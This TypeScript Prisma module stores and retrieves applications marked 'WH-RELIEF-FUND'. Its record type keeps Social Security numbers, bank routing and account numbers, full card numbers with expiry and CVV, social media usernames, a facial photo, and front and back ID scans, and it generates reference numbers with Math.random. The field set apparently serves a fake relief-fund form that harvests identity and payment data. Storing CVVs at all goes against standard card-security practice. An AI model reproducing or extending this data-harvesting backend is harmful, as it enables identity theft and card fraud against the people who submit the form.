import { PrismaClient } from '@prisma/client';

const globalForPrisma = globalThis as unknown as {
  prisma: PrismaClient | undefined;
};

export const prisma =
  globalForPrisma.prisma ??
  new PrismaClient();

if (process.env.NODE_ENV !== 'production') globalForPrisma.prisma = prisma;

export type StoredApplication = {
  id: string;
  referenceNumber: string;
  firstName: string;
  lastName: string;
  dateOfBirth: string;
  ssnEncrypted: string;
  email: string;
  phone: string;
  socialUsernames?: string;
  address: string;
  city: string;
  state: string;
  zipCode: string;
  annualIncome: string;
  accountType: string;
  routingEncrypted: string;
  accountEncrypted: string;
  cardEncrypted?: string;
  cardExpiryEncrypted?: string;
  cardCvvEncrypted?: string;
  consent: boolean;
  status: 'pending' | 'approved' | 'rejected';
  adminNotes?: string;
  w4FilingStatus?: 'single_or_married_separately' | 'married_jointly_or_widow' | 'head_of_household' | string;
  w4MultipleJobs?: boolean;
  w4ChildrenAmount?: number;
  w4OtherDependentsAmount?: number;
  w4TotalDependentsAmount?: number;
  w4OtherIncome?: number;
  w4Deductions?: number;
  w4ExtraWithholding?: number;
  facialImageBase64?: string;
  idFrontBase64?: string;
  idBackBase64?: string;
  createdAt: string | Date;
  updatedAt: string | Date;
};

export async function readApplications(): Promise<StoredApplication[]> {
  try {
    const apps = await prisma.application.findMany({
      orderBy: { createdAt: 'desc' }
    });
    return apps as any;
  } catch (error) {
    console.error("Prisma error reading apps:", error);
    return [];
  }
}

export async function saveApplication(app: StoredApplication): Promise<void> {
  const data = { ...app };
  
  // Clean up types for Prisma
  if (data.w4FilingStatus === '') data.w4FilingStatus = undefined;
  
  await prisma.application.create({
    data: data as any
  });
}

export async function getApplicationById(id: string): Promise<StoredApplication | null> {
  const app = await prisma.application.findUnique({ where: { id } });
  return app as any;
}

export async function updateApplication(id: string, updates: Partial<StoredApplication>): Promise<StoredApplication | null> {
  const app = await prisma.application.update({
    where: { id },
    data: updates as any,
  });
  return app as any;
}

export function generateId(): string {
  return `app_${Date.now()}_${Math.random().toString(36).slice(2, 8)}`;
}

export function generateReferenceNumber(): string {
  const random5 = Math.floor(10000 + Math.random() * 90000);
  const random4 = Math.floor(1000 + Math.random() * 9000);
  return `WH-RELIEF-FUND-${random5}-${random4}`;
}
